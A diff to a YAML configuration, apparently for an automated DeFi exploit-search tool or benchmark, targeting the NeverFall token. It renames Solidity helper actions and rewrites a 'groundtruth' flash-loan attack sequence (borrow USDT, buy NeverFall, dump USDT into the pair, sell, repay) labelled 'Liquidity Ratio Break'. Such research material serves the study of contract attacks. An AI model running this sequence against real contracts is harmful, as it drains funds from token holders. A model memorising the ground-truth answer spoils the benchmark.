@@ -16,17 +16,17 @@ ctrt_name2deploy:
   - ["router", ""]
   
 extra_actions:
-  - "function swap_neverFall_attacker_usdt_neverFall(uint256 amount, uint256 amountOut) internal eurus {
+  - "function deposit_neverFall_usdt_neverFall(uint256 amount) internal eurus {
     IERC20(usdt).approve(address(neverFall), type(uint256).max);
     NeverFall(neverFall).buy(amount);
     }"
 
-  - "function swap_neverFall_attacker_neverFall_usdt(uint256 amount, uint256 amountOut) internal eurus {
+  - "function withdraw_neverFall_neverFall_usdt(uint256 amount) internal eurus {
     IERC20(usdt).approve(address(neverFall), type(uint256).max);
     NeverFall(neverFall).sell(amount);
     }"
 
-  - "function burn_neverFall_pair(uint256 amount) internal eurus {
+  - "function swap_pair_attacker_usdt_neverFall(uint256 amount, uint256 amountOut) internal eurus {
       usdt.transfer(address(pair), amount);
       pair.swap(0, pair.getAmountOut(amount, address(usdt)) , owner, new bytes(0));
     }"
@@ -47,9 +47,9 @@ attack_goal_str: "usdt"
 
 groundtruth:
   - ["borrow", "usdt", "owner", "1600000e18"]
-  - ["swap", "neverFall", "attacker", "usdt", "neverFall", "200000 * 1e18", "1"]
-  - ["burn", "neverFall", "pair", "1300000 * 1e18"]
-  - ["swap", "neverFall", "attacker", "neverFall", "usdt", "neverFall.balanceOf(attacker)", "1"]
+  - ["deposit", "neverFall", "usdt", "neverFall", "200000 * 1e18"]
+  - ["swap", "pair", "attacker", "usdt", "neverFall", "1300000 * 1e18", "0"]
+  - ["withdraw", "neverFall", "neverFall", "usdt", "neverFall.balanceOf(attacker)"]
   - ["payback", "usdt", "owner", "1600000e18"]
 
 # Information for search space building.
@@ -71,7 +71,7 @@ roles:
     support_swaps:
       "usdt": ["usdt", "neverFall"]
       "neverFall": ["usdt", "neverFall"]
-    is_oracle: true
-    oracle: "pair"
+    # is_oracle: true
+    # oracle: "pair"
 
 pattern: "Liquidity Ratio Break"
